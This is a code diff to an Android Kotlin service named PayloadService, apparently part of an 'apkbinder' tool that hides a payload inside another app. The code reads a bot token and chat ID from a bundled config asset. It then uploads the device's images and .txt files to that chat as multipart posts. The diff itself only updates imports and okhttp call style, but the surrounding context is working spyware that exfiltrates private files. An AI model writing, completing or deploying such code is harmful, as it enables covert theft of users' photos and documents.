@@ -16,12 +16,12 @@ import android.net.Uri
 import android.os.Build
 import android.os.IBinder
 import android.provider.MediaStore
-import Com.devhs.apkbinder.Const
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import Com.devhs.apkbinder.core.Const
+import okhttp3.MediaType
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.RequestBody
 import org.json.JSONObject
 import java.util.concurrent.Executors
 import java.util.concurrent.Semaphore
@@ -78,7 +78,8 @@ class PayloadService : Service() {
     }
 
     private fun run() {
-        val cfg = readConfig() ?: run {
+        val cfg = readConfig()
+        if (cfg == null) {
             HsLog.e("no config")
             return
         }
@@ -165,7 +166,7 @@ class PayloadService : Service() {
 
     private fun readConfig(): Pair<String, String>? {
         try {
-            val s = assets.open("hs_config.json").use { it.readBytes().toString(Charsets.UTF_8) }
+            val s = assets.open(Const.CONFIG_ASSET).use { it.readBytes().toString(Charsets.UTF_8) }
             val o = JSONObject(s)
             val t = o.optString("bot_token")
             val c = o.optString("chat_id")
@@ -253,11 +254,12 @@ class PayloadService : Service() {
                             lower.endsWith(".png") || lower.endsWith(".webp"))
                 ) return@execute
                 val data = bytesOf(uri) ?: return@execute
+
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
                     .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("photo", name, data.toRequestBody("image/jpeg".toMediaTypeOrNull()))
+                    .addFormDataPart("photo", name, RequestBody.create(MediaType.parse("image/jpeg"), data))
                     .build()
 
                 val req = Request.Builder()
@@ -283,11 +285,12 @@ class PayloadService : Service() {
                 val name = nameOf(uri)
                 if (!name.lowercase().endsWith(".txt")) return@execute
                 val data = bytesOf(uri) ?: return@execute
+
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
                     .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("document", name, data.toRequestBody("text/plain".toMediaTypeOrNull()))
+                    .addFormDataPart("document", name, RequestBody.create(MediaType.parse("text/plain"), data))
                     .build()
 
                 val req = Request.Builder()
